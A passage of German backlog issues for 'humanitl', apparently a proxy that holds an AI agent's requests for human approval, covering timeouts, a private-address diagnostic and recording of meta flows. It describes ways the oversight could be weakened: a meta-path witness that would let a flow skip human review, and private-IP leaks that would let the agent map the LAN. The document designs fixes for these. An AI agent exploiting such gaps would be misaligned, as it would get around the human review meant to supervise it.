- `ui.sound`, `ui.notifications`, `experimental.ws_hold` und die beiden `pseudonyms`-Schlüssel tragen `pending`, und `docs/CONFIG.md` zeigt es.

### Akzeptanzkriterien
- [x] Die erste Entscheidung (`idle_timeout_secs` gegen `header_timeout_secs`) ist getroffen und in `CONVENTIONS.md` 4.25 begründet; am Ende beschreibt kein Schlüssel dieselbe Spanne wie ein anderer.
- [x] Jeder Schema-Pfad steht im Register, und der Test wird rot, sobald einer fehlt oder einer zu viel ist (`every_schema_path_has_a_register_line`, Probe mit einem erfundenen Feld).
- [x] Eine gehaltene Anfrage und eine schweigende Durchreiche überleben die Leerlaufgrenze; eine leere Verbindung nicht — und eine Keep-Alive-Verbindung nach ihrer Antwort ebenso wenig (`daemon/crates/proxy/tests/timeouts.rs`, jeder Fall mit oberer und unterer Schranke).
- [x] `docs/CONFIG.md` kommt aus dem Generatorlauf und nennt für jeden noch nicht wirksamen Schlüssel sein Issue; ein Test hält dazu fest, dass die Spezifikation dieses Issues den Schlüssel wörtlich nennt.
- [x] Der IPC-Stapel ist von den Grenzen ausgenommen (`daemon/crates/ipc/src/server.rs:1152` reicht `header_timeout_secs` allein an die LLM-Probe, nie an den tonic-Server). **Die zweite Hälfte des Kriteriums entfällt**: Es wurde keine Uhr gebaut, von der auszunehmen wäre — `limits.idle_timeout_secs` ist entfernt statt verdrahtet. Ein Test über einen minutenlang stummen Ereignisstrom prüfte damit nichts, was dieses Issue geändert hat. Er gehört an das Issue, das eine Uhr baut: HUM-120 nennt den IPC-Stapel in seinem Nicht-Ziel.
- [x] `cargo fmt --all -- --check`, clippy mit `-D warnings`, `cargo build --workspace --all-targets`, `cargo test --workspace`, `cargo doc` mit `-D warnings`, `tools/check-deps.sh`, `scripts/ci/lint-docs.sh` und `scripts/ci/lint-no-string-errors.sh` grün. Die Flutter-Hälfte von `make check` läuft auf dieser Maschine nicht: `protoc-gen-dart` fehlt, `scripts/gen-proto.sh` überspringt die Dart-Seite, und `app/lib/core/ipc/generated` entsteht nicht. Der Diff fasst kein `app/**` und kein `proto/**` an.

### Fallstricke
- Eine Leerlaufgrenze auf der Verbindung zum Agenten schneidet ohne den Zähler genau den Hold ab, den sie verschonen soll. Das ist der Grund, warum dieser Schlüssel gefährlicher ist als sein Fehlen.
- Der Zähler muss die CONNECT-Rekursion überleben: `ConnectionContext::tunnel` klont den Kontext (`handler.rs:335-341`), und ein Zähler, der dabei verlorengeht, lässt getunnelte Holds ungeschützt.
- Ein neuer `reason` zieht Proto, `convert.rs` und die Dart-Seite nach sich, dazu `CONVENTIONS.md` 3.2 mit dem Status je Grund.

### Ergebnis (2026-09-05)

**Erste Entscheidung: `limits.idle_timeout_secs` ist entfernt, `limits.header_timeout_secs` bleibt.** Der dritte Weg also, und aus vier Gründen der einzige ehrliche. Erstens deckt `header_read_timeout` in `hyper` beide Hälften derselben Spanne ab, das Eintreffen der Kopfzeilen und die Lücke bis zur nächsten Anfrage; die Uhr ist genau so lange gespannt, wie die Verbindung auf einen Anfragekopf wartet. Zweitens war der zweite Schlüssel mit seinen Vorgabewerten unerreichbar: 90 Sekunden Leerlauf gegen 30 Sekunden Kopf-Frist, die kürzere Uhr läuft immer zuerst ab. Drittens ist die einzige Spanne, die er allein beschreiben könnte, die Stille **während** einer laufenden Anfrage — und genau dort darf keine Uhr laufen, weil dort der Hold sitzt. Viertens folgt daraus, dass kein Wrapper vor `serve_connection` und kein Zähler gehaltener Flüsse nötig ist: Es bleibt keine zweite Uhr, die anzuhalten wäre. Entfernt wird nach dem Muster von HUM-088, ohne Alias; die Begründung steht in `backlog/CONVENTIONS.md` 4.25.

**Drei Spannen bleiben unbewacht, und sie sind benannt statt eingebaut.** Nicht nur der gestreamte Antwort-Rumpf: Auch der Anfrage-Rumpf wird ohne Frist gepuffert (`handler.rs:597`, hypers Kopf-Uhr ist da schon gelöscht; es greift allein die Byte-Grenze `hold_body_cap_bytes`), und der TLS-Handschlag nach einem `CONNECT` hat gar keine Uhr (`handler.rs:337`). `limits.body_timeout_secs` trägt deshalb `pending(HUM-120)`, und HUM-120 heißt jetzt „Drei unbewachte Spannen der Verbindung". Alle drei werden an Stellen bewacht, die in `handler.rs` liegen — an dieser Datei wurde parallel gearbeitet, deshalb kein Code in diesem Commit. Die Form gehört mit ins Issue: Beide Rumpf-Grenzen begrenzen die Stille zwischen zwei Stücken und nicht die Gesamtdauer, was der heutige Doku-Kommentar sagt; diese Umdeutung ist ausdrücklich Teil von HUM-120, samt `docs/CONFIG.md` und CONVENTIONS 4.4 im selben Commit. Eine Gesamtdauer von 300 Sekunden risse den Strom des lokalen Sprachmodells, jeden langen Download und jeden großen Upload ab.

**Das Register liegt in `daemon/crates/config/tests/config_readers.rs`.** 43 Zeilen, eine je Blattpfad, Einstufung `effective` oder `pending(HUM-xxx)`; die Angabe am Feld ist `x-pending-issue` in `src/model.rs`, gebaut wie `x-tier`. Sechs Tests halten es: jeder Schema-Pfad hat eine Zeile und jede Zeile einen Pfad, Register und Schema nennen dasselbe Issue, das Register ist sortiert, jedes genannte Issue steht als Zeile in `BACKLOG.md`, die Liste der Schlüssel ohne Leser ist ausgeschrieben, und `limits.idle_timeout_secs` ist weg. Die Probe des Registers selbst prüft die Vergleichsfunktion mit einem erfundenen Pfad und mit einem entfernten, damit der Vollständigkeitstest nicht nur sich selbst prüft.

**Jeder `pending`-Zeiger zeigt auf ein Issue, das den Schlüssel wirklich nennt — und ein Test hält das fest.** Vier Spezifikationen nannten ihren Schlüssel zunächst nicht: HUM-069 (sprach von `configGet` und `SubscribeConfig`, aber weder von `ui.notifications` und `ui.theme` noch von `notificationsEnabled` und `themeModeProvider`), HUM-115 (baut den `HickoryResolver` hinter `resolver.nameserver`, wusste aber nichts vom Register), HUM-079 und HUM-087. Alle vier tragen die fehlenden Sätze jetzt: je eine Pfadzeile auf `model.rs` und `config_readers.rs` und je ein Akzeptanzkriterium, das die Registerzeile auf `effective` dreht.

Geprüft wird das nicht mehr an der Form, sondern an der Sache: `every_pending_entry_points_at_an_issue_that_names_the_key` verlangt eine Zeile in `BACKLOG.md`, eine Überschrift `## HUM-xxx` in einer `backlog/sprint-*.md` **und** den Schlüsselpfad wörtlich in deren Abschnitt. Die erste Fassung prüfte nur die Tabellenzeile — und die bleibt stehen, wenn ein Issue erledigt ist. Nachgemessen: `pending(HUM-104)` an `ui.sound` war unter der alten Prüfung grün, obwohl HUM-104 längst gemergt ist und den Schlüssel nie nennt; unter der neuen Prüfung fällt es mit dem Satz „the specification of HUM-104 never names the key" auf.

**Zehn Schlüssel tragen `pending`, drei mehr als das Issue nannte.** Neu gefunden hat das Register `resolver.nameserver` (der Daemon warnt beim Start und fragt trotzdem `/etc/resolv.conf`), `ui.theme` (dieselbe fehlende Naht wie bei `ui.notifications`) und, als bereits bekanntes eigenes Issue, `resolver.test_ca` (HUM-087). Die Zuordnung: `experimental.upstream_port_map` HUM-088, `experimental.ws_hold` und `ui.sound` HUM-121 (neu), `limits.body_timeout_secs` HUM-120 (neu), `pseudonyms.*` HUM-079, `resolver.nameserver` HUM-115 (die Bestandsaufnahme vom 2026-09-05 baut dort den `HickoryResolver` hinter den Schlüssel), `resolver.test_ca` HUM-087, `ui.notifications` und `ui.theme` HUM-069. Neu angelegt wurden nur HUM-120 und HUM-121; die Nummern 107 bis 119 gehören der Bestandsaufnahme vom selben Tag.

**Ein entfernter Schlüssel warnt, er scheitert nicht.** Die erste Fassung machte aus `limits.idle_timeout_secs` einen harten `CONFIG_002`, wie bei einem Tippfehler. Das ist die Strafe für eine Entscheidung, die wir getroffen haben und nicht der Nutzer: Seine Datei war gestern gültig, und der Daemon startet nach dem Update nicht mehr. Der Pfad steht deshalb in `alias::RETIRED` mit Issue und Grund, das Laden übergeht ihn und legt `CONFIG_005` als Warnung dazu, und `docs/CONFIG.md` führt ihn in einer eigenen Tabelle „Entfallene Schlüssel". Ein unbekannter Schlüssel ohne Eintrag in `RETIRED` bleibt der harte Fehler. Die Regel gilt für jede künftige Streichung, also auch für `experimental.upstream_port_map` in HUM-088; sie steht in `backlog/CONVENTIONS.md` 4.25, und HUM-088 ist darauf umgestellt.

**Die Warnung über einen entfallenen Schlüssel sieht heute niemand, und das ist notiert.** `load_config` (`daemon/bin/humanitld/src/main.rs:483-489`) schreibt jeden Befund des Ladens mit `tracing::warn!` und verwirft ihn danach; unter systemd landet er im Journal, und die Oberfläche erfährt nichts. Für einen Schlüssel, dessen Wert stillschweigend übergangen wird, ist genau das der Fall, in dem der Mensch es erfahren muss. Der Weg dorthin ist gebaut und wird nur nicht benutzt: `report_recorder_diagnostics` (`main.rs:302-330`) veröffentlicht Befunde ohne Flow als `FlowEvent::Diagnostic { flow_id: None }` in den Ereignisstrom, und HUM-106 sammelt sie in `diagnosticsProvider`. Es fehlt, dass `load_config` seine Befunde behält, bis die Warteschlange steht, und sie dort einspeist. Der Daemon gehört nicht zu den Pfaden dieses Issues; das Kriterium hängt deshalb an HUM-069, das die Konfiguration ohnehin anfasst und für die kaputte `config.toml` schon ein solches Kriterium führt.

**Die Grenze des Registers steht in seinem Kopf, und drei Tests halten sie.** Der Durchlauf findet Blätter über `properties`. Die Schlüssel *in* einer freien Tabelle und die Elemente einer Liste sind deshalb nicht einzeln erfasst — der Behälter trägt die Zeile. `the_schema_hides_no_leaf_from_the_walk` wird rot, sobald in einem Behälter eine Struktur steht, und ebenso bei `allOf`, `anyOf` oder `$ref`. Die Prüfung sieht dabei nicht nur eine Ebene tief: `Vec<Enum mit Struktur-Varianten>` legt seine Felder unter `items.oneOf[].properties` und `BTreeMap<String, Vec<Struktur>>` zwei Behälter tief — beide Formen kamen an der ersten Fassung vorbei (nachgemessen), die zweite Fassung steigt durch `items`, `additionalProperties`, `oneOf`, `anyOf` und `prefixItems` ab und nennt in der Meldung weiterhin den Behälter. `#[serde(flatten)]` ist dabei kein Loch: nachgemessen mit einem `flatten` in `Experimental`, das der Generator wegen `inline_subschemas` in die `properties` einschmilzt, sodass der Vollständigkeitstest es als `experimental.enabled` ohne Registerzeile nennt. `every_alias_leads_to_a_registered_key` deckt die dritte Lücke: Jeder Alias zeigt auf ein registriertes Blatt und ist selbst keines. Dazu `no_group_carries_a_pending_note`: Ein `x-pending-issue` an einer Gruppe wirkt nicht — `leaves()` filtert Gruppen weg, und `docs/CONFIG.md` zeigt für jedes Blatt darunter weiter „ja" —, es ist aber ein naheliegender Irrtum, und ohne diese Zusicherung fiele nur der Schema-Schnappschuss auf, den derselbe Mensch neu schreibt.

**Die Zeitgrenzen-Tests binden an die Konfiguration, nicht an das Vorhandensein einer Uhr.** Jeder der vier Fälle misst eine untere **und** eine obere Schranke, und die beiden Schließen-Fälle laufen mit zwei verschiedenen konfigurierten Werten (1 s und 3 s). Die Überlebens-Fälle messen nach dem Hold beziehungsweise nach dem Strom, dass dieselbe Verbindung dann nach genau der konfigurierten Frist schließt; damit fällt auch eine fest verdrahtete Frist durch, die den kurzen Fall zufällig überlebt. Nachgemessen mit `Duration::from_secs(5)` an der Stelle der Konfiguration: alle vier rot, jeder mit dem Satz „the clock does not come from limits.header_timeout_secs". Ein fünfter Fall hält den heutigen Zustand des Anfrage-Rumpfs fest — keine Uhr, die Verbindung bleibt offen —, und er wird rot, sobald HUM-120 diese Spanne schließt.

**`docs/CONFIG.md` hat eine Spalte „Wirkung"** mit `ja` oder `offen (HUM-xxx)` und einen Abschnitt, der beides erklärt; `docs/SECURITY.md` nennt die Rumpfgrenze ausdrücklich als heute wirkungslos, statt sie in einer Zeile mit den drei wirksamen Grenzen zu führen.

## HUM-102 · Die abgelehnte private Adresse hat keinen Diagnostic
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-015, HUM-025 · Blockiert: —

### Kontext
ADR-006, Zeile 39: „wird die Verbindung abgelehnt: `BlockReason::PrivateAddress`, Diagnostic `PROXY_005` mit einem Regelvorschlag." Den Diagnostic gibt es nicht. `PROXY_005` heißt im Code „Ungültiger Übergang im Flow" (`core-types/src/diagnostics/codes.rs:295`) und wird an ganz anderer Stelle ausgelöst (`handler.rs:1099`). Für die abgelehnte private Adresse gibt es `BlockReason::PrivateAddress` und `UpstreamError::PrivateAddress(ip)`, beides erreicht die Oberfläche und trägt die Adresse mit (`ipc/src/convert.rs:1068-1072`) — aber keinen Befund, kein `why`, keinen `fix`.

Das trifft den Normalfall dieses Produkts. Das Sprachmodell steht im LAN, andere interne Dienste auch. Die Durchreichregel trägt `allow_private` und deckt nur Inferenz und die Modellliste (`sandbox/src/agent/opencode.rs:423-453`). Jede andere Anfrage an denselben Server geht durch die Warteschlange, und wenn ein Mensch dort „Erlauben" drückt, scheitert sie trotzdem: `flow.allow_private` wird ausschließlich aus einer Regel gesetzt (`pipeline.rs:349`), nie aus einer menschlichen Entscheidung. Der Mensch sieht eine abgelehnte Verbindung mit einer IP-Adresse und erfährt nicht, dass seine Freigabe an einer Sperre gescheitert ist, die nur eine Regel öffnet.

### Der Fund, der dieses Issue umgedreht hat
Der Review hat gezeigt, dass ein bloßer Regelvorschlag das Produkt **unsicherer** machen würde, statt es zu erklären. Der Grund steht in `pipeline.rs:347-349`: `flow.allow_private` wird nur im Zweig `Action::Allow` gesetzt. Eine Regel mit `action: ask` und `allow_private: true` parst anstandslos (`rules/src/parse.rs:355`, ohne die Prüfung, die `passthrough_llm` hat) und **wirkt nicht**. Wer also dem naheliegenden, engen Vorschlag folgt, bekommt eine wirkungslose Regel und eine zweite Ablehnung ohne neue Erklärung. Wirksam bleibt nur `action: allow` — und damit wird aus „ein Mensch erlaubt eine Anfrage" dauerhaft „alle künftigen Anfragen an diesen Host laufen ungehalten hinaus". Der Vorschlag verleitet also bauartbedingt zu mehr Öffnung als die Freigabe, die gerade gescheitert ist.

Deshalb ist die Behebung von `pipeline.rs` Teil dieses Issues und nicht eines späteren: `flow.allow_private |= self.rule_allows_private(rule);` gehört vor das `match action`, damit eine Regel mit `action: ask` und `allow_private: true` das Ziel öffnet und die Anfrage trotzdem jedes Mal einem Menschen gezeigt wird. Das ist der Vorschlag, den der Befund machen soll.

### Ziel
Die Ablehnung einer privaten Adresse liefert einen Befund mit eigener Nummer, `why` und einem `fix`, den ein Klick anwendet — und der vorgeschlagene Weg ist der enge: das Ziel wird geöffnet, die Aufsicht bleibt.

### Nicht-Ziel
Keine Aufweichung von ADR-006: eine menschliche Freigabe öffnet weiterhin **nicht** von sich aus ein privates Ziel. Kein globaler Schalter. Nicht in diesem Issue: die zweite Entscheidung mit sichtbarer Adresse — die Ablehnung samt Adresse zurück in die Warteschlange zu geben, damit ein Mensch ein zweites Mal entscheidet, diesmal über `10.0.0.5`, gültig für diese eine Anfrage. Das wäre die sauberste Auflösung des Widerspruchs, dass die unbeaufsichtigte Mechanik (die Regel) mehr darf als die beaufsichtigte (der Mensch); sie ist für M3 zu groß und bekommt ihr eigenes Issue, sobald dieses steht.

### Betroffene Pfade
- `daemon/crates/core-types/src/diagnostics/codes.rs`: `PROXY_008`, ans Ende des Bereichs
- `daemon/crates/proxy/src/handler.rs`: der Befund entsteht in `record_failure` beim Match auf `UpstreamError::PrivateAddress(ip)`
- `daemon/crates/proxy/src/pipeline.rs`: `allow_private` vor das `match action`
- `daemon/crates/rules/src/parse.rs`: Rundlauf-Test für die vorgeschlagene Regel
- `docs/adr/0006-dns-after-allow.md`: die falsche Nummer wird berichtigt
- `docs/DIAGNOSTICS.md` aus dem Generatorlauf

### Spezifikation
Der Befund entsteht an **einer** Stelle: in `record_failure`, beim Match auf `UpstreamError::PrivateAddress(ip)`. Nicht dort, wo `AddressRefusal::Private` zurückkommt — das ist nur der DNS-Zweig; ein IP-Literal liefert den Fehler direkt (`upstream.rs:212-215`), und der dritte Aufrufer ist die Endpunkt-Probe (`ipc/src/server.rs:1102-1114`), wo es weder einen Fluss noch eine sinnvolle Regel gibt.

Der `fix` ist ein `FixAction::AddRule(Box<Rule>)` — dieser Typ existiert und ist bis in die Oberfläche durchgezogen (`core-types/src/diagnostics/mod.rs:85`, `ipc/src/convert.rs:110`, die Proto, `app/lib/core/ipc/convert.dart:70`) und wird dort per Klick angewandt. Ein Text zum Abtippen wäre nicht nur schwächer, er erfüllte das eigene Akzeptanzkriterium nicht, denn `fix` ist `Option<FixAction>` und kein Freitext. Und das Abtippen ist genau die Stelle, an der die Enge verlorengeht.

Die vorgeschlagene Regel trägt: `action: ask` mit `allow_private: true`; `HostPattern::Exact(host)`, bei einem IP-Literal `HostPattern::Ip(ip)`, weil ein Glob eine Adresse nie trifft (ADR-007, `rules/src/host.rs:126`); den Port; das Schema; und die Methode der gescheiterten Anfrage. Der Pfad kommt aus `flow.request.path_and_query`, aber **immer** durch `strip_query` (`rules/src/path.rs:78-96`) — roh übernommen landete sonst ein Token aus der Abfragezeichenkette in `rules.yaml`. Ergibt der Pfad kein zulässiges Präfix (die Mindestlänge ab `/` ist zwei Zeichen, `core-types/src/rule.rs:396-402`, also etwa bei `GET /`), bleibt das Feld weg statt leer.

Die Adresse und der Vorschlag stehen im `Diagnostic` und in `resolved_ip`, **nie** im Rumpf der Blockantwort und nie in einer Kopfzeile zum Agenten. Die Sandbox hat keinen Resolver — das ist die erste Garantie —, der Agent kennt also nur den Namen. Die Zuordnung dieses Namens zu einer privaten Adresse ist für ihn neue Information und taugt zur Vermessung des LAN. Heute geht sie ausschließlich an die Oberfläche (`convert.rs:772`, `:1068`), und der Banner trägt nur den Grund ohne Adresse (`block.rs:151-156`); das bleibt so.

### Tests
- Ein Fluss auf einen Namen, der auf `10.0.0.5` auflöst, ohne Regel mit `allow_private`: genau ein Befund, mit der Adresse und einer `FixAction::AddRule`, deren Regel Host, Port, Schema und Methode nennt.
- Derselbe Fall mit einem IP-Literal: der Befund entsteht ebenso, und die Regel trägt `HostPattern::Ip`.
- Rundlauf: die vorgeschlagene Regel durch `parse_rules` und `serialize_rules`, dann muss sie den gescheiterten `RequestKey` treffen. Ohne diesen Test ist „anwendbar" unbewiesen.
- Nach Anwendung des Vorschlags: die Anfrage wird gehalten statt abgelehnt, und eine zweite Anfrage an dasselbe Ziel wird wieder gehalten. Dieser Test schlägt heute fehl und belegt die Behebung in `pipeline.rs`.
- Ein Test, dass weder der Rumpf der Blockantwort noch eine Kopfzeile die Adresse trägt.
- Mutationsprobe: den `fix` aus dem Befund entfernen, dann wird der erste Test rot.

### Akzeptanzkriterien
- [x] Jede Ablehnung wegen einer privaten Adresse erzeugt genau einen Befund mit `why` und einer anwendbaren `FixAction::AddRule`.
- [x] Die vorgeschlagene Regel hält die Anfrage weiterhin an, statt sie dauerhaft freizugeben, und sie wirkt — belegt durch den Test, der heute fehlschlägt.
- [x] Adresse und Vorschlag erreichen den Agenten nicht.
- [x] ADR-006 nennt die richtige Nummer.
- [x] `docs/DIAGNOSTICS.md` kommt aus dem Generatorlauf.
- [x] `make check`, clippy mit `-D warnings` und `cargo fmt --all -- --check` grün.

### Fallstricke
- `PROXY_004` und `PROXY_006` sind frei. Eine Lücke nachzubelegen macht die Registry schwerer lesbar; die neue Nummer kommt ans Ende des Bereichs.
- `flow.allow_private` vor das `match action` zu ziehen ändert das Verhalten für **jede** Regel mit `allow_private`, nicht nur für die vorgeschlagene. Das ist beabsichtigt, gehört aber in `CONVENTIONS.md` und braucht einen Test, der zeigt, dass eine Regel mit `action: block` und `allow_private: true` weiterhin blockt.

## HUM-103 · Meta-Flüsse fehlen in der Historie
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-073, HUM-026, HUM-031 · Blockiert: —

### Kontext
HUM-073 verlangt in seinem vierten Akzeptanzkriterium, dass Anfragen an `humanitl.internal` in der Historie erscheinen: „Meta-Requests werden im Recorder als Flow mit `state=Recorded`, `decision=meta` gespeichert (sichtbar in History, Filter `meta:true`), nicht gehalten, nicht auditiert außer `/ask`." Umgesetzt ist es nicht, und beide Reviewer kommen unabhängig zu demselben Schluss wie der Umsetzer: innerhalb der Pfade von HUM-073 ist es nicht sauber baubar.

Was fehlt, ist mehr als eine Zeile. Der Zustandsautomat kennt keinen Weg nach `Recorded`, der nicht über eine Sperre führt (ADR-004). `decision=meta` gibt es weder in `Decision` noch in `DecisionKind` der Proto, also auch nicht im Recorder-Schema und nicht im Filter. Und `meta:` ist kein Term der Filtersprache — die drei Stellen, die diese Sprache auslegen, sind Gegenstand von HUM-099.

Ein Fluss mit erfundener Entscheidung wäre keine Lösung: `decision` sagt aus, wie über eine Anfrage entschieden wurde, und über eine Meta-Anfrage entscheidet niemand. Der Umsetzer von HUM-073 hat sie deshalb ausdrücklich nicht angelegt, statt eine Behauptung über einen Menschen zu speichern, der nichts getan hat (`backlog/CONVENTIONS.md` 4.13).

### Ziel
Eine Anfrage an den Meta-Endpunkt erscheint in der Historie als das, was sie ist: eine Auskunft, die der Agent sich geholt hat, ohne dass jemand entschieden hat. Sie ist filterbar, sie ist von einer echten Entscheidung unterscheidbar, und sie verfälscht keine Zählung, die über Entscheidungen spricht.

### Nicht-Ziel
Keine Rümpfe der Meta-Antworten in der Aufzeichnung. Keine Auditierung von `/` und `/why`; `/ask` bleibt auditiert wie bisher. Keine Änderung an der Weiche selbst.

### Betroffene Pfade
- `daemon/crates/core-types/src/flow.rs` und die Proto: die neue Variante
- `daemon/crates/recorder/`: Migration, Spalte, Query
- `daemon/crates/recorder/src/filter.rs` und der Dart-Fake: der Term `meta:`
- `app/lib/features/history/`: Anzeige und Filter
- `tests/fixtures/filter-language.json` aus HUM-099, sofern das bis dahin steht

### Spezifikation
Die neue Variante steht neben den Entscheidungen, nicht unter ihnen. Wo heute über Entscheidungen gezählt oder gefiltert wird (`decision:allow`, `decision:block`, die Zahlen im Demolauf), zählt ein Meta-Fluss nicht mit, außer der Filter nennt ihn ausdrücklich. `meta:true` liefert genau die Meta-Flüsse, `meta:false` genau die übrigen; ohne den Term erscheinen beide, damit die Historie zeigt, was wirklich passiert ist.

Die Zeile in der Historie nennt den Pfad (`/`, `/why/<id>`, `/ask`) und den Statuscode, nicht den Inhalt. Bei `/ask` steht der gesäuberte Text, denn er ist ohnehin schon als Ereignis durch die Oberfläche gegangen.

Der Weg im Zustandsautomaten ist der kleinste, der ohne Lüge auskommt: von der Annahme unmittelbar nach `Recorded`, ohne `Held` und ohne `Decided`. Der ADR-004 wird um diesen Weg ergänzt, mit der Begründung.

### Tests
- Ein Lauf mit je einer Anfrage an `/`, `/why/<id>` und `/ask`: drei Einträge in der Historie, `meta:true` liefert genau sie, `meta:false` keinen davon.
- Ein Test, dass `decision:allow` und `decision:block` keinen Meta-Fluss mitzählen.
- Ein Test, dass der Rumpf einer Meta-Antwort nirgends in der Aufzeichnung landet.
- Mutationsprobe: die neue Variante aus dem Filter entfernen, dann wird der erste Test rot.

### Akzeptanzkriterien
- [x] Drei Meta-Anfragen erzeugen drei Einträge, unterscheidbar von Entscheidungen.
- [x] `meta:true` und `meta:false` teilen die Historie vollständig und überschneidungsfrei.
- [x] Keine Zählung über Entscheidungen ändert sich durch Meta-Flüsse.
- [x] Akzeptanzkriterium 4 von HUM-073 ist hier abgehakt, und die Notiz dort verweist auf dieses Issue.
- [x] `make check`, clippy mit `-D warnings` und `cargo fmt --all -- --check` grün.

### Fallstricke
- Der Demolauf M2 zählt bediente Anfragen und Entscheidungen. Kommen Meta-Flüsse hinzu, ohne dass die Zählung sie ausnimmt, wird er rot — und zwar zu Recht; die Zahlen gehören dann angepasst, nicht der Filter.
- `meta:` als Filterterm trifft auf drei Auslegungen derselben Sprache (HUM-099). Wer diesen Term hinzufügt, bevor HUM-099 die gemeinsame Tabelle gebaut hat, fügt ihn dreimal hinzu.

### Stand (2026-09-05)

**Kein `decision=meta`.** Die Zusammenfassung in `BACKLOG.md` und das vierte
Akzeptanzkriterium von HUM-073 nennen eine neue Variante in `Decision` und in
`DecisionKind`. Gebaut ist das Gegenteil, und die Spezifikation dieses Issues
verlangt es selbst: „Die neue Variante steht **neben** den Entscheidungen, nicht
unter ihnen." `decision` sagt aus, wie über eine Anfrage entschieden wurde; über
eine Meta-Anfrage entscheidet niemand. Der Datensatz trägt deshalb die neue
Spalte `flows.meta` und lässt `decision` leer. Das kostet nichts und spart die
Fallunterscheidung an jeder Stelle, die über Entscheidungen zählt: `decision:allow`,
`decision:block` und die Zahlen des Demolaufs lassen einen Meta-Fluss von selbst
aus, weil er keine Entscheidung trägt — sie mussten ihn nicht ausnehmen. Eine
fünfte `DecisionKind`-Variante hätte dagegen jeden erschöpfenden `match` über
`Decision` angefasst (Zustandsautomat, `convert.rs`, `validate.rs`, die
Warteschlange, sechs Dart-Dateien) und jedem dieser Orte die Frage gestellt, was
„die Entscheidung *meta*" bedeutet — eine Frage ohne Antwort.

**Der Weg im Zustandsautomaten: `Received → Recorded`, gebunden an den Fluss.**
Neu sind `TransitionInput::Answer(MetaAnswer)`, `Flow::is_meta`, `Flow::answer`
und `AnswerRefused` in `daemon/crates/core-types/src/flow.rs`. Der Weg führt aus
`Received` unmittelbar in den Endzustand, ohne `Held` und ohne `Decided`. Damit
er kein Weg am Menschen vorbei ist, hängt er weder an der Sorgfalt des Aufrufers
noch an einem Wert, den man mitbringt: `Flow::apply` lehnt `Answer` ab, sobald
`Flow::is_meta` an **diesem** Fluss nicht gilt, und die einzige Tür dorthin ist
`Flow::answer`, die den Grund nennt (`PROXY_009` für den falschen Host,
`InvalidTransition` für den falschen Zustand) und den Nachweis nicht herausgibt.
`MetaAnswer` ist `#[non_exhaustive]`, außerhalb der Crate also nicht baubar, und
trägt keine Angaben. Der reservierte Name wohnt dafür jetzt als
`humanitl_core::META_HOST` im Kern (`HostName::is_meta`); `humanitl_proxy::meta`
reicht ihn weiter, damit die Weiche und die Prüfung denselben Namen meinen.

**Der erste Entwurf war zu schwach, und die Reviews haben es gezeigt.** Er
hängte den Weg an einen Nachweis, den `MetaAnswer::for_request(&HttpRequest)`
ausstellte. Antigravity prüfte ihn gegen Fälschung — kein `Default`, kein
`serde`, kein öffentlicher Konstruktor, keine Test-Hintertür — und alle Wege,
den Host vorzutäuschen; beides hielt. Codex fand die andere Frage: **Ein
Nachweis belegt, dass *irgendeine* Anfrage an den reservierten Namen ging, nicht
dass diese es tat.** Ein Aufrufer konnte sich einen für `humanitl.internal`
holen und ihn über `Flow::apply` auf einen gewöhnlichen Fluss anwenden, der noch
in `Received` stand — jede Anfrage steht dort nach der Ankunft, und der Fluss
landete in `Recorded`, ohne dass ein Mensch ihn je gesehen hätte. Von den beiden
angebotenen Wegen wurde der erste gewählt (Prüfung am Fluss, im Augenblick des
Abschließens) statt des zweiten (`FlowId` oder Autorität im Nachweis
mitführen): Ein Nachweis, der nicht reisen kann, kann nicht am falschen Ort
ankommen, und die Prüfung am Fluss deckt zusätzlich den Fall ab, dass jemand
`flow.request` zwischen Ausstellen und Anwenden austauscht. Kosten: `Answer`
steht nicht mehr in der Tabelle von `flow_state_table.rs`, weil sein Nachweis
dort nicht baubar ist. Ersatz und Begründung stehen im Modulkommentar dieser
Datei; die Deckung ist eher größer geworden — `the_meta_path_opens_only_from_received`
geht jeden der acht Zustände durch, und die crate-interne Gegenprobe
`a_witness_does_not_open_a_foreign_flow` wendet einen **echten** Nachweis auf
einen fremden Fluss an.

Verworfen wurden drei Alternativen. **(a) Ein freier Übergang `Received →
Recorded`:** Jede gewöhnliche Anfrage steht nach der Ankunft in genau diesem
Zustand; ein Fehler im Proxy hätte sie ungeprüft und unentschieden
abgeschlossen. Ein Test hätte nur zeigen können, dass der Proxy den Weg heute
nicht nimmt — das ist Disziplin, keine Zusage. **(b) Ein eigener Zustand
`Answered`, in den kein Übergang führt:** Wäre ebenso dicht, hätte aber
`FlowState`, das Proto-Enum `FlowState` und jeden `match` darüber angefasst,
inklusive des Zeugen in `flow_state_table.rs` — viel Fläche für ein Feld, das
die Zeile ohnehin trägt. **(c) Den Fluss ganz am Automaten vorbei in die
Aufzeichnung schreiben:** Dann gäbe es zwei Wege, eine Flow-Zeile anzulegen, und
der zweite hätte keine Regel, an die er sich hält.

**Kein neues `FlowEvent` und kein Ereignis an die Zuhörer.** Der Übergang
erzeugt `FlowEvent::Recorded`; Vermerk und Statuscode trägt
`Recorder::set_meta_answer` nach, wie `set_flow_error` es für den abgebrochenen
TLS-Handschlag tut (HUM-045). Der Handler ruft `Recorder::apply` direkt statt
`HoldQueue::publish`: Ein Meta-Fluss ist fertig, bevor ein Zuhörer etwas mit ihm
anfangen könnte, er gehört nicht in die `FlowRegistry` — die führt die Flows,
über die noch entschieden werden kann, und `/why` beantwortet genau die —, und
ein `Received` im Strom hätte eine Zeile behauptet, deren Vermerk aus der
Registry gar nicht kommen kann. Folge, ausgesprochen: Die Historie zeigt einen
Meta-Fluss erst beim nächsten Laden, nicht als Ankunft in der Pille.

**Was aufgezeichnet wird.** Kopfzeilen der Anfrage, bei `/ask` zusätzlich der
**gesäuberte** Text der Bitte (nie der rohe Rumpf des Agenten), Pfad, Methode und
der Statuscode, den der Proxy selbst geschrieben hat. Kein Rumpf einer
Meta-Antwort, an keiner Stelle; `no_body_of_a_meta_answer_is_recorded` durchsucht
dafür alle Dateien der Aufzeichnung nach einem Stück der Statusausgabe.

**Der Filterterm `meta:`.** In `daemon/crates/recorder/src/filter.rs` als
Wahrheitswert wie `edited:` und `passthrough:`, und im Dart-Fake
(`FakeFlowFilter`) an derselben Stelle. Die dritte Auslegung derselben Sprache,
`humanitl_ipc::convert::matches_filter`, kennt weiterhin nur `host:`, `state:`
und `session:` — sie kennt auch `decision:`, `edited:` und `findings:` nicht.
`meta:` wurde dort **nicht** ergänzt: Das ist die bewusst kleinere Lesart, die
HUM-099 zusammenführt, und ein einzelner Term mehr hätte die Divergenz nur
